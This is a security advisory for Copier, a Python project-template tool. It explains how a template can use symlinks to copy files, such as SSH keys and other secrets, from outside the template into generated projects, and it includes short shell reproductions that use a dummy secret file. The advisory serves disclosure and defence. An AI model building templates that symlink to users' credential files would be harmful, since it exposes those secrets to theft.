# [M] Copier safe template has arbitrary filesystem read access via symlinks when _preserve_symlinks: false

## Summary
Severity: Medium
Advisory: GHSA-xjhm-gp88-8pfx
CVE: CVE-2026-23968
CWE: CWE-61
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-xjhm-gp88-8pfx
Type: github-advisory

## Affected
- PyPI: `copier` — affected >=0 <9.11.2

## Details
### Impact

Copier suggests that it's safe to generate a project from a safe template, i.e. one that doesn't use [unsafe](https://copier.readthedocs.io/en/stable/configuring/#unsafe) features like custom Jinja extensions which would require passing the `--UNSAFE,--trust` flag. As it turns out, a safe template can currently include arbitrary files/directories outside the local template clone location by using symlinks along with [`_preserve_symlinks: false`](https://copier.readthedocs.io/en/stable/configuring/#preserve_symlinks) (which is Copier's default setting). 

Imagine, e.g., a malicious template author who creates a template that reads SSH keys or other secrets from well-known locations and hopes for a user to push the generated project to a public location like [github.com](https://github.com/) where the template author can extract the secrets.

Reproducible example:

- Illegally include a file in the generated project via symlink resolution:

    ```shell
    echo "s3cr3t" > secret.txt

    mkdir src/
    pushd src/
    ln -s ../secret.txt stolen-secret.txt
    popd

    uvx copier copy src/ dst/

    cat dst/stolen-secret.txt
    #s3cr3t
    ```

- Illegally include a directory in the generated project via symlink resolution:

    ```shell
    mkdir secrets/
    pushd secrets/
    echo "s3cr3t" > secret.txt
    popd

    mkdir src/
    pushd src/
    ln -s ../secrets stolen-secrets
    popd

    uvx copier copy src/ dst/

    tree dst/
    # dst/
    # └── stolen-secrets
    #     └── secret.txt
    #
    # 1 directory, 1 file
    cat dst/stolen-secrets/secret.txt
    # s3cr3t
    ```

### Patches

n/a

### Workarounds

n/a

### References

n/a

## References
- https://github.com/copier-org/copier/security/advisories/GHSA-xjhm-gp88-8pfx
- https://nvd.nist.gov/vuln/detail/CVE-2026-23968
- https://github.com/copier-org/copier/commit/b3a7b3772d17cf0e7a4481978188c9f536c8d8f6
- https://github.com/copier-org/copier
